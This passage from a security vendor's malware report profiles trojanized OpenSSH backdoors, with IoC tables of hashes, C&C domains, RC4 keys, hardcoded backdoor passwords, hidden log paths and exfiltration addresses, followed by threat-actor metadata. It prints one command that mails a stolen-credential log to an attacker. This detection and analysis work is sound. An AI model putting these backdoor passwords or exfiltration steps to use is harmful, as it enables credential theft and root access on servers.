`962d7af7-3e01-48a2-8100-8377916c12f8`\n\nC&C linux-flavor[.]net\n\nRC4 Key `THAlVGydJjBaElZeiSvMRVAInypylVvq`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `f348b1aec4cafc3fc004003458ce65636991d712`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.3p1 (x86)`\n\nUUID `2199b968-8a08-4dac-b3b8-8c64a168c598`\n\nC&C linux-flavor[.]net\n\nRC4 Key `tTlxgWHDLroHwuHaqYjdwciBsxhuzfny`\n\nBackdoor password `“5c0b616400ebfcfd67022cc767ac3ab6“ (MD5)`\n\nRSA key\n```\n         -----BEGIN PUBLIC KEY----         MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAutfSf5IeNDW8TVUrL/H3\n         oX3h8cdMMzr+CO63tykuEy+397KFZKIuRNL2yVbl7+W/SDP49qB7rOR0Pls20UqV\n         FqsdauUoSH5IUu5lMuwQRS1w8VHbk4eGJroIULaJFNSqEg1xX8U4cqmSLbD3uHIx\n         N0cfvHRqIYNLm9URDcVIYQv8sg5lSed9WjlxnA8oR1nkr3azkOoCE7JGolVUrA76\n         KJ+GmgjvQIKNazbiOp3ST7LGAXkvZFf5j2Yih0H0TvBX1C8qSG8iMPm2zcrB/wjk\n         3kWOZYqFDm6WDe0gnZTOg8RSSo0EImtH7dM84qwXrHm+KRWeF1oU6N/OVZYlLOOt\n         vbbSmVA02z/EEOn+gpsH+7p5iQiGK0iERkeHC0FFVb5wCPVF21aiy6FH6IngwP1v\n         MA3rm9BF+62DokEi/8LQseW8Vu6zd4LPrQaVt/xJT8OT85kSc11HfpUJLO7Qj8C/\n         FtYAAhdHtITAy0OenNStN6k5dBk5XfEqn3rPN9CvIyh9m5SM4TC86t9NIka2iyC9\n         LbBl685ftZxUjYcsgyeN19qD+l2J9SbPhw4+Xg5/5w6Xzp/R8lvhYAQq6qciMbIt\n         BwThS9wRI9yWC93Hv/yIjm99ZtVSuWOrIvClEtb7mRZ3iGr73FM6Myyv8J8c6OMZ\n         RRF3wcTSrCgLTw6vMcT4aLMCAwEAAQ==\n         -----END PUBLIC KEY----\n#### 10.19 Onderon\n\n##### ESET detection names\n\n```\nLinux/SSHDoor.O, Linux/SSHDoor.T, Linux/SSHDoor.U, Linux/SSHDoor.AG, Linux/\nSSHDoor.BC, Linux/SSHDoor.BN, Linux/SSHDoor.BO, Linux/SSHDoor.CB, Linux/\nSSHDoor.CE, Linux/SSHDoor.CF\n\n\n-----\n\n##### Known period of activity\n\nFrom 2010 to present (Oct 2018)\n\nAlso known as “bl0wsshd00r67p1”\n\n##### Features\n\n- log remote host (only in client version), username and password\n\n- data encrypted in recent versions\n\n- attacker can log in as root\n\n- anti-logging feature\n\n- client and daemon versions available\n\n##### Exfiltration techniques\n\n- log structure:\n\n  - client version: «user:password@host -→ %s:%s@%s\\n»\n\n  - daemon version: “user:password -→ %s:%s\\n”\n\n##### Existing documentation or source code\n\n[Source code: https://packetstormsecurity.com/files/128816/OpenSSL-6.7p1-bl0wssh­](https://packetstormsecurity.com/files/128816/OpenSSL-6.7p1-bl0wsshd00r67p1-Backdoor.html)\n_[d00r67p1-Backdoor.html](https://packetstormsecurity.com/files/128816/OpenSSL-6.7p1-bl0wsshd00r67p1-Backdoor.html)_\n\n##### IoCs\n\n\n_Table 21_ _Onderon samples configuration_\n\n\nHash (SHA-1) `66b809792ad1cf9461f4592acf1cdd9111bf9ae6`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.3p1`\n\nLog filename `“/usr/lib/mozilla/extensions/mozzlia.ini”`\n\nBackdoor password `“WEJH123JKH1J24HWBERJQWEHJR132124124512”`\n\n\nHash (SHA-1) `78acd95139f4162a610dbd2d1dcbfd0c3ab99684`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.8p1`\n\nLog filename `“/tmp/zilog”`\n\nBackdoor password `“asdasdqaza”`\n\n\nHash (SHA-1) `5353af393112e6e5eda99bf19e0b02c36bfe3559`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.3p1 (x86)`\n\nLog filename `“/usr/tmp/~tmp441”`\n\nBackdoor password `“A*99Vs5L77d”`\n\n\nHash (SHA-1) `f02c6df5dd2a92a2637e5a0ce493a8cf79a0c351`\n\n\nType `Daemon`\n\nVersion `OpenSSH_4.3p1`\n\nLog filename `“/var/opt/power”`\n\nBackdoor password `“lz123..0***”`\n\n\n-----\n\nType `Daemon`\n\nVersion `OpenSSH_4.3p2`\n\nLog filename `“/usr/local/share/man/man1/Openssh.1”`\n\nBackdoor password `“ssh@qu.se”`\n\n\nHash (SHA-1) `6eb4a83502ea3063a3c6171a71ec3216eb9ec6ce`\n\n\nType `Daemon`\n\nVersion `OpenSSH_6.6p1`\n\nLog filename `“/usr/lib/gcc/x86_64-redhat-linux/.0”`\n\nBackdoor password `“jHr@FrIendLy@)eXplOiTeR=”`\n\n\nHash (SHA-1) `7ae69340fbaada0e9017bd453dface505d397877`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.8p1`\n\nLog filename `“/etc/ssh/ssh_known_hosts”`\n\nBackdoor password `“$1$ytoMBVEP$6x.YSPCwlJya4Lzvnu0tW0” (bcrypted)`\n\n\nHash (SHA-1) `f6e73c88c7c971054ff3065507f1ab40df2c9b0b`\n\n\nType `Client`\n\nVersion `OpenSSH_3.9p1`\n\nLog filename `“/usr/share/man/man1/.olog”`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `3c8a6029e9a695a414a75ac3d06fd92809bd52c2`\n\n\nType `Client`\n\nVersion `OpenSSH_5.3p1`\n\nLog filename `“/usr/include/sn.h”`\n\nBackdoor password `N/A`\n\n#### 10.20 Polis Massa\n\n##### ESET detection names\n\nLinux/SSHDoor.P, Linux/SSHDoor.R, Linux/SSHDoor.X, Linux/SSHDoor.AS, Linux/\nSSHDoor.AY, Linux/SSHDoor.BL, Linux/SSHDoor.BU, Linux/SSHDoor.CG\n\n##### Known period of activity\n\nFrom 2008 to present (Oct 2018)\n\n\n-----\n\n##### Features\n\n- log remote host, username and password\n\n- data encoded (NOT bytes)\n\n- attacker can log in as root (password plain or bcrypted)\n\n- anti-logging feature\n\n- client and daemon versions available\n\n##### Exfiltration techniques\n\n- log structure\n\n  - client version:\n\n   - “Sniffed --> %s \\tuser: %s \\tpass: %s\\n” (remote_host, username, password)\n\n   - “pass_out: %s:%d \\tuser: %s \\tpass: %s \\t(%s)\\n” (remote_host,\n\nremote_port, username, password, remote_hostname)\n\n   - “out: %s \\t: %s \\t: %s \\t(%s)\\n” (remote_host, username, password,\n\nremote_hostname)\n\n  - daemon version: “(pass|passwd)_from: %s \\tuser: %s \\tpass: %s\\n”\n\n(remote_host, username, password)\n\n- only in client versions\n\n  - execute: “cat <log_filename> | mail -s “Salut sefu, am noutati”\n\n<email_address>”\n\n##### Existing documentation or source code\n\nSource code:\n\n- https://packetstormsecurity.com/files/download/34453/apatch-ssh-3.8.1p1.tar.gz\n\n- https://packetstormsecurity.com/files/123584/\n\nSatyrs-OpenSSH-Autobackdooring-Doohicky-0.1.html\n\n##### IoCs\n\n\n_Table 22_ _Polis Massa samples configuration_\n\n\nHash (SHA-1) `77025a5f4d714918ca22e92387ae7395be17ba65`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.2p1 (x86)`\n\nLog filename `“/usr/lib/libpanel.so.a.3”`\n```\n             “Accepted host %s ip %sclient_user%s server_\n\n```\nBackdoor password\n```\n             user %s”\n\n```\nEmail `N/A`\n\n\nHash (SHA-1) `1d5f3ecdea636e837cedd0a21d7a73203071f4c2`\n\n\nType `Daemon`\n\nVersion `OpenSSH_3.9p1 (x86)`\n\nLog filename `“/usr/share/boot.sync”`\n\nBackdoor password `\"poe350wag718\"`\n\nEmail `dann3bunu@yahoo[.]com`\n\n\n-----\n\nType `Client`\n\nVersion `OpenSSH_3.9p1 (x86)`\n\nLog filename `“/usr/share/boot.sync”`\n\nBackdoor password `N/A`\n\nEmail `dann3bunu@yahoo[.]com`\n\n\nHash (SHA-1) `3b403369fb1600f2cc6072585e439e92f7de096c`\n\n\nType `Daemon`\n\nVersion `OpenSSH_4.7p1`\n\nLog filename `“/usr/include/mbstring.h”`\n\nBackdoor password `“GWSllM1NdMdsE” (bcrypted, salt=”GW”)`\n\nEmail `N/A`\n\n\nHash (SHA-1) `69784162aeab9a6bbcdc1e1f502524eb796e70d2`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.5p1`\n\nLog filename `“/var/html/lol”`\n\nBackdoor password `“FaeEkcuoKLomN” (bcrypted, salt=”Fa”)`\n\nEmail `N/A`\n\n\nHash (SHA-1) `651bc9a1eea9e886f9c56a791e6f2a1263502cab`\n\n\nType `Client`\n\nVersion `OpenSSH_6.0p1`\n\nLog filename `“/usr/share/boot.sync”`\n\nBackdoor password `N/A`\n\nEmail r0fl24@yahoo[.]com\n\n\nHash (SHA-1) `84ce13d3196800ed6c9643e808f47cc96f67e20c`\n\n\nType `Daemon`\n\nVersion `OpenSSH_6.0p1`\n\nLog filename `“/usr/share/boot.sync”`\n\nBackdoor password `“Akjshdfsd8fuisdjfhsd87f”`\n\nEmail r0fl24@yahoo[.]com\n\n\nHash (SHA-1) `9a74e4b3a46ac1cc603502d2ef10768ceccb2d8f`\n\n\nType `Client`\n\nVersion `OpenSSH_3.7.1p2`\n\nLog filename `“/var/log/utmp”`\n\nBackdoor password `N/A`\n\nEmail `N/A`\n\n\n-----\n\nType `Daemon`\n\nVersion `OpenSSH_7.4p1`\n\nLog filename `“/usr/share/boot.sync”`\n\nBackdoor password `“ZXVtmMSrd2F2ecDqPj4mXNzn”`\n\nEmail `acvila.1977@protonmail[.]com`\n\n\nHash (SHA-1) `40400734f766444779bd907aa7fc5cf375b5ba74`\n\n\nType `Daemon`\n\nVersion `OpenSSH_6.4p1`\n\nLog filename `“/usr/share/boot.sync”`\n\nBackdoor password `“wzLJJVQ4JMJQz4yEdJCTVAaM”`\n\nEmail `acvila.1977@protonmail[.]com`\n\n\nHash (SHA-1) `fdbf978badb738bf7d5d05e1ccb30433e14a5ebc`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.3p1`\n\nLog filename `“/usr/share/boot.sync”`\n\nBackdoor password `“naimanmij1981”`\n\nEmail `fartingbunny@protonmail[.]com`\n\n#### 10.21 Quarren\n\n##### ESET detection name\n\nLinux/SSHDoor.Q\n\n##### Known period of activity\n\nFrom 2015 to present (Oct 2018)\n\n##### Exfiltration techniques\n\n          - log structure\n\n         - user is authorized by PAM: “PPAM: h: %s, u: %s, p: %s\\n”\n\n         - user is not authorized by PAM: “h: %s, u: %s, p: %s\\n”\n\n          - examples of filename used:\n\n        - user is authorized by PAM: “/usr/share/man/man5/ttyl.5.gz”\n\n        - user is not authorized by PAM: “/usr/share/man/man5/ttyv.5.gz”\n\n##### Features\n\n          - log remote host, username and password\n\n          - attacker can log in as root (password bcrypted)\n\n          - anti-logging feature\n\n          - only a daemon version detected\n\n\n-----\n\n##### OpenSSH versions trojanized\n\n- OpenSSH_5.1p1\n\n- OpenSSH_5.3p1\n\n##### IoCs\n\n\n_Table 23_ _Quarren samples configuration_\n\n\nHash (SHA-1) `3898d60b41ba2665f4e694f06d263fe558db97c5`\n\n\nVersion `OpenSSH_5.1p1`\n```\n             “/usr/share/man/man5/ttyl.5.gz” (PAM) or “/usr/\n\n```\nLog filename\n```\n             share/man/man5/ttyv.5.gz” (not PAM)\n\n```\nBackdoor password `“$1$p07lj588$8HpZkidOEkIbgUCcLVw331” (bcrypted,`\n```\n             salt=”$1$p07lj588$”)\n\n```\n\nHash (SHA-1) `6515109c55fd0673332c302f9cb68f9c2567457c`\n\n\nVersion `OpenSSH_5.3p1`\n```\n             “/usr/share/man/man5/ttyl.5.gz” (PAM) or “/usr/\n\n```\nLog filename\n```\n             share/man/man5/ttyv.5.gz” (not PAM)\n\n```\nBackdoor password `“$1$z5q8k2Pw$KxBES6xTuEFOayvJvokKf1” (bcrypted,`\n```\n             salt=”$1$z5q8k2Pw$”)\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.welivesecurity.com/wp-content/uploads/2018/12/ESET-The_Dark_Side_of_the_ForSSHe.pdf"
    ],
    "report_names": [
        "ESET-The_Dark_Side_of_the_ForSSHe.pdf"
    ],
    "threat_actors": [
        {
            "id": "c9617bb6-45c8-495e-9759-2177e61a8e91",
            "created_at": "2022-10-25T15:50:23.405039Z",
            "updated_at": "2025-03-27T02:00:55.462193Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Carbanak",
                "Anunak"
            ],
            "source_name": "MITRE:Carbanak",
            "tools": [
                "Carbanak",
                "Mimikatz",
                "PsExec",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3844202f-b24a-4e16-b7b9-dfe8c0a44d5d",
            "created_at": "2022-10-25T16:07:24.526179Z",
            "updated_at": "2025-03-27T02:02:10.27234Z",
            "deleted_at": null,
            "main_name": "Operation Windigo",
            "aliases": [],
            "source_name": "ETDA:Operation Windigo",
            "tools": [
                "CDorked",
                "CDorked.A",
                "Calfbot",
                "Ebury"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5cbf6c32-482d-4cd2-9d11-0d9311acdc28",
            "created_at": "2023-01-06T13:46:38.39927Z",
            "updated_at": "2025-03-27T02:00:02.823829Z",
            "deleted_at": null,
            "main_name": "ENERGETIC BEAR",
            "aliases": [
                "DYMALLOY",
                "TG-4192",
                "Crouching Yeti",
                "Group 24",
                "Havex",
                "IRON LIBERTY",
                "Blue Kraken",
                "ALLANITE",
                "Koala Team",
                "G0035",
                "ATK6",
                "ITG15",
                "Ghost Blizzard",
                "BERSERK BEAR"
            ],
            "source_name": "MISPGALAXY:ENERGETIC BEAR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "649b5b3e-b16e-44db-91bc-ae80b825050e",
            "created_at": "2022-10-25T15:50:23.290412Z",
            "updated_at": "2025-03-27T02:00:55.431037Z",
            "deleted_at": null,
            "main_name": "Dragonfly",
            "aliases": [
                "TEMP.Isotope",
                "DYMALLOY",
                "Berserk Bear",
                "TG-4192",
                "Crouching Yeti",
                "IRON LIBERTY",
                "Energetic Bear",
                "Ghost Blizzard"
            ],
            "source_name": "MITRE:Dragonfly",
            "tools": [
                "MCMD",
                "Impacket",
                "CrackMapExec",
                "Backdoor.Oldrea",
                "Mimikatz",
                "PsExec",
                "Trojan.Karagany",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1f6ae238-765f-4495-9d54-6a7883d7a319",
            "created_at": "2022-10-25T16:07:24.573456Z",
            "updated_at": "2025-03-27T02:02:10.284644Z",
            "deleted_at": null,
            "main_name": "TA511",
            "aliases": [
                "MAN1",
                "Moskalvzapoe"
            ],
            "source_name": "ETDA:TA511",
            "tools": [
                "Agentemis",
                "Chanitor",
                "Cobalt Strike",
                "CobaltStrike",
                "Ficker Stealer",
                "Hancitor",
                "NetSupport",
                "NetSupport Manager",
                "NetSupport Manager RAT",
                "NetSupport RAT",
                "NetSupportManager RAT",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "542cf9d0-9c68-428c-aff8-81b6f59dc985",
            "created_at": "2023-02-15T02:01:49.554105Z",
            "updated_at": "2025-03-27T02:00:03.110991Z",
            "deleted_at": null,
            "main_name": "Moskalvzapoe",
            "aliases": [
                "MAN1",
                "TA511"
            ],
            "source_name": "MISPGALAXY:Moskalvzapoe",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "1934b371-2525-4615-a90a-772182bc4184",
            "created_at": "2022-10-25T15:50:23.396576Z",
            "updated_at": "2025-03-27T02:00:55.460522Z",
            "deleted_at": null,
            "main_name": "Windigo",
            "aliases": [
                "Windigo"
            ],
            "source_name": "MITRE:Windigo",
            "tools": [
                "Ebury"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ed3810b7-141a-4ed0-8a01-6a972b80458d",
            "created_at": "2022-10-25T16:07:23.443259Z",
            "updated_at": "2025-03-27T02:02:09.801771Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Anunak",
                "Carbanak",
                "Carbon Spider",
                "ELBRUS",
                "Gold Waterfall",
                "Sangria Tempest"
            ],
            "source_name": "ETDA:Carbanak",
            "tools": [
                "AVE_MARIA",
                "Agentemis",
                "AmmyyRAT",
                "Antak",
                "Anunak",
                "Ave Maria",
                "AveMariaRAT",
                "BABYMETAL",
                "BIRDDOG",
                "Backdoor Batel",
                "Batel",
                "Bateleur",
                "BlackMatter",
                "Boostwrite",
                "Cain & Abel",
                "Carbanak",
                "Cl0p",
                "Cobalt Strike",
                "CobaltStrike",
                "DNSMessenger",
                "DNSRat",
                "DNSbot",
                "DRIFTPIN",
                "DarkSide",
                "FOXGRABBER",
                "FlawedAmmyy",
                "HALFBAKED",
                "JS Flash",
                "KLRD",
                "MBR Eraser",
                "Mimikatz",
                "Nadrac",
                "Odinaff",
                "POWERPIPE",
                "POWERSOURCE",
                "PsExec",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "SocksBot",
                "SoftPerfect Network Scanner",
                "Spy.Agent.ORM",
                "TEXTMATE",
                "TeamViewer",
                "TiniMet",
                "TinyMet",
                "Toshliph",
                "VB Flash",
                "WARPRISM",
                "avemaria",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041817,
    "ts_creation_date": 1543517464,
    "ts_modification_date": 1543517467,
    "files": {
        "pdf": "https://archive.orkl.eu/b418f8a762ec974f7ad7a7d02f01d69e0f3db0dc.pdf",
        "text": "https://archive.orkl.eu/b418f8a762ec974f7ad7a7d02f01d69e0f3db0dc.txt",
        "img": "https://archive.orkl.eu/b418f8a762ec974f7ad7a7d02f01d69e0f3db0dc.jpg"
    }
}